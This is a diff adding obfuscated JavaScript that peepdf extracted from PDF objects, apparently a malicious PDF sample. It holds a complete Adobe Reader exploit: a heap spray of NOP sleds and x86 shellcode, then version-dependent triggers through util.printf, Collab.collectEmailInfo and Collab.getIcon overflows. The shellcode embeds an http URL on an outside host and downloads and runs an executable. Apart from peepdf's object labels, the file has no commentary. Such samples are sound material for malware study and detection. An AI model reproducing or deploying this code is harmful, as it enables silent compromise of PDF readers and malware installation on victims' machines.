@@ -1,0 +1,68 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+this.I1L()
+
+// peepdf comment: Javascript code located in object 13 (version 0)
+
+var a32u = new Array();
+
+function x46n(a63x, n68r) {
+    while (a63x.length * 2 < n68r) {
+        a63x += a63x;
+    }
+    a63x = a63x.substring(0, n68r / 2);
+    return a63x;
+}
+
+function s87m(z8r) {
+    var n31h = 0x0c0c0c0c;
+    var c44o = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u652F%u6461%u2E6A%u7572%u652F%u7078%u6C2F%u616F%u2E64%u6870%u3F70%u7473%u7461%u573D%u6E69%u6F64%u7377%u6C2F%u616F%u2E64%u6870%u2670%u3D73%u0031");
+    if (z8r == 1) {
+        n31h = 0x30303030;
+        c44o = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u652F%u6461%u2E6A%u7572%u652F%u7078%u6C2F%u616F%u2E64%u6870%u3F70%u7473%u7461%u573D%u6E69%u6F64%u7377%u6C2F%u616F%u2E64%u6870%u2670%u3D73%u0032");
+    }
+    if (z8r == 2) {
+        c44o = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u652F%u6461%u2E6A%u7572%u652F%u7078%u6C2F%u616F%u2E64%u6870%u3F70%u7473%u7461%u573D%u6E69%u6F64%u7377%u6C2F%u616F%u2E64%u6870%u2670%u3D73%u0033");
+    }
+    var y30g = 0x400000;
+    var s53o = c44o.length * 2;
+    var n68r = y30g - (s53o + 0x38);
+    var a63x = unescape("%u9090%u9090");
+    a63x = x46n(a63x, n68r);
+    var t54x = (n31h - 0x400000) / y30g;
+    for (var n44j = 0; n44j < t54x; n44j++) {
+        a32u[n44j] = a63x + c44o;
+    }
+}
+
+function d46a() {
+    var a3r = app.viewerVersion.toString();
+    if (a3r > 8) {
+        s87m(1);
+        var r76n = "12999999999999999999";
+        for (e74p = 0; e74p < 276; e74p++) {
+            r76n += "8";
+        }
+        util.printf("%45000f", r76n);
+    }
+    if (a3r < 8) {
+        s87m(0);
+        var x31z = unescape("%u0c0c%u0c0c");
+        while (x31z.length < 44952) x31z += x31z;
+        this.collabStore = Collab.collectEmailInfo({
+            subj: "",
+            msg: x31z
+        });
+    }
+    if (a3r < 9.1) {
+        if (app.doc.Collab.getIcon) {
+            s87m(2);
+            var e41k = unescape("%09");
+            while (e41k.length < 0x4000) e41k += e41k;
+            e41k = "N." + e41k;
+            app.doc.Collab.getIcon(e41k);
+        }
+    }
+}
+d46a();
+
